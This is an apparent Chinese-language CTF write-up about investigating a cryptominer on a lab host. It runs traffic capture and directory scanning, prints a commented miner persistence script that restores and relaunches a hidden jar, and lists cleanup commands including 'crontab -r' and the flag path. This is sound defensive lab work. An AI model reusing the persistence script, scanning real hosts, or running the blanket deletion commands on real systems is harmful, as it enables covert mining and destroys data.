## 1 步骤一

> [!info]
> 使用工具分析共有多少 IP 存在扫描 web 特征，提交其数量

扫描 `web` 也就是扫描目录，他给了 `web` 端口，那我们自己扫描一下看看特征。

先用 `tshark` 捕获一下目标响应的 `http` 流量

```bash
sudo tshark -i eth0 -f 'src host 161.189.96.95 and src port 19999' -Y 'http'
```

然后用 `dirsearch` 执行扫描目录命令，等开始扫描时立即退出

```bash
dirsearch -u http://161.189.96.95:19999/
```

可以看到大多多是 `404` 的响应，那我们就找收到 `404` 多的 `ip`

![[挖矿-学校挖矿排查-260115-212824.png]]

我们在统计中，选择统计目标 `ip`(因为 `404` 响应的目标才是攻击机，源则是受攻击机本身)

![[挖矿-学校挖矿排查-260115-213024.png]]

下方的过滤器中输入：`http.response.code == 404`，过滤出我们找的 `404` 响应，然后看 `Count` 列显示的数量，确定存在扫描特征的 `ip` 共 `29` 个 (话说他这不顺便显示一下数量 (哪怕我们计算的不是全部条目)，手动数是真麻烦)

## 11 步骤十一

> [!info]
> 清除掉后门挖矿程序，在/var/flag/3/flag 下查看提交 flag

对于后门持久化脚本，分析后写了注释后的版本如下，我们可以知道原始后门文件的路径、被执行后门文件位置、日志路径等信息

```sh
#!/bin/bash

# 11 原始文件路径
SOURCE_FILE="/usr/share/.miner/miner.jar"
# 目标文件路径
DEST_FILE="/tmp/miner.jar"
# 进程名称
PROCESS_NAME="java -jar $DEST_FILE"
# 日志文件路径
LOG_FILE="/var/log/.malware_events.log"


# 如果进程存在，什么也不做
if pgrep -f "$PROCESS_NAME" > /dev/null; then
    exit 0
else
    echo "[$(date)] Miner process not found. Taking action..." >> "$LOG_FILE"

    # 如果目标文件不存在，从原始文件复制过去
    if [ ! -f "$DEST_FILE" ]; then
        echo "[$(date)] Miner file ($DEST_FILE) is missing. Restoring from backup..." >> "$LOG_FILE"
        
        cp "$SOURCE_FILE" "$DEST_FILE"
        chmod +x "$DEST_FILE"
    fi

    # 启动挖矿程序
    if [ -f "$DEST_FILE" ]; then
        nohup java -jar "$DEST_FILE" > /dev/null 2>&1 &
        echo "[$(date)] Miner process restarted with PID $!." >> "$LOG_FILE"
    else
        echo "[$(date)] CRITICAL: Could not restore miner file from backup. Cannot start." >> "$LOG_FILE"
    fi
fi
```

知道这些信息后，我们先删掉计划任务，然后再删除持久化脚本文件，再删除原始后门文件，再删除衍生后门文件，最后杀掉进程即可。

```sh
crontab -r
rm -f /usr/share/.per/persistence.sh
rm -f /usr/share/.miner/miner.jar
rm -f /tmp/miner.jar
kill -9 <PID>
cat /var/flag/3/flag
```
